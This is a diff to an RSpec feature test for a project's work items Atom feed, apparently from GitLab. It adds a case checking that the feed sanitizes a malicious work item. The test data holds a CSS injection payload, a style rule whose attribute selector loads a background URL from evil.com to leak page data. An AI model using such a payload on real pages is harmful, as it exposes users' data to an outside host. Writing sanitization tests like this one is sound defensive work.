@@ -87,13 +87,33 @@ RSpec.describe 'Project Work Items RSS Feed', feature_category: :team_planning d
       it 'renders work item fields' do
         visit project_work_items_path(project, :atom, feed_token: user.feed_token)
 
-        expect(body).to have_selector('entry title[type="html"]', text: 'test work item title')
+        expect(body).to have_selector('entry title', text: 'test work item title')
         expect(body).to have_selector('entry summary', text: 'test work item title')
         expect(body).to have_selector('entry content[type="html"]', text: 'test work item desc')
         expect(body).to have_selector('feed > title', text: "#{project.name} work items")
         expect(body).to have_selector('entry work_item_type', text: 'Issue')
         expect(body).to have_selector('entry state', text: 'opened')
       end
+    end
+
+    context 'with Markdown in the title and a potentially malicious description' do
+      let!(:issuable) do
+        payload = '<style>*[href^="a"]{background:url(//evil.com/a)}</style>'
+
+        create(
+          :work_item,
+          author: user,
+          project: project,
+          title: "#{payload} Fix #{work_item.to_reference} in `parser`",
+          description: "#{payload}\n\n**Legitimate text**"
+        )
+      end
+
+      before do
+        visit project_work_items_path(project, :atom, feed_token: user.feed_token)
+      end
+
+      it_behaves_like 'a sanitized issuable atom feed'
     end
 
     context 'with multiple work items' do
